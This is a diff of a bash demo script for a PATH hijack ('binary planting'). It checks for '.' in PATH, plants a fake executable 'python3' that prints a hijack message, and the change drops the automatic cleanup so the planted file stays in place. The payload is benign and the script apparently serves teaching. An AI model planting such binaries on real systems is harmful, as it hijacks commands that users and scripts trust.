@@ -2,16 +2,16 @@
 
 set -e
 
-echo "[*] Attempting PATH hijack..."
+echo "[*] Preparing PATH hijack (Binary Planting)"
 
-# Check if '.' is in PATH
+# Check if '.' exists in PATH
 if [[ ":$PATH:" != *":.:"* ]]; then
-    echo "[!] No vulnerability detected: '.' not in PATH"
+    echo "[!] No vulnerability detected: '.' not found in PATH"
     echo "[*] Attack aborted."
     exit 1
 fi
 
-echo "[*] Vulnerability confirmed: '.' found in PATH"
+echo "[*] Vulnerability confirmed: '.' is present in PATH"
 
 echo "[*] Original python3 location:"
 which python3
@@ -20,13 +20,8 @@ which python3
 echo -e '#!/bin/bash\necho "🔥 PYTHON EXECUTION HIJACKED"' > ./python3
 chmod +x ./python3
 
-echo "[*] Running hijack..."
+echo "[*] Now run 'python3' manually to observe the hijack"
 
-python3
-
-rm -f ./python3
-
-echo "[*] Demo complete."
 
 
 
